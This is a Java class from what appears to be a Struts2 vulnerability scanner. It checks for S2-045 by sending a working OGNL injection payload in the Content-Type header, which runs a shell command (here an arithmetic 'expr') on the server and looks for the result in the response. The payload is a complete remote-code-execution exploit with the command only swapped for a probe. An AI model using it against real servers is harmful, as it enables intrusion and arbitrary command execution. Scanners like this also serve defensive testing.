package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_045 implements Check {
    public String printInfo(){
        String info = "[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        Map<String,String> data = new HashMap<String,String>();
        Map<String,String> headers = new HashMap<String,String>();

        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='expr "+number1+" + "+number2+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
        data.put("","");
        headers.put("Content-Type",poc);

        int numsum = number1+number2;

        String url = protocol+"://"+host+":"+port+path;


        try {
            HttpResult result= HttpClient.post(url,data,headers);;
            Pattern p = Pattern.compile(String.valueOf(numsum));
            Matcher m =p.matcher(result.getData());

            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){
            return false;
        }




        }



}
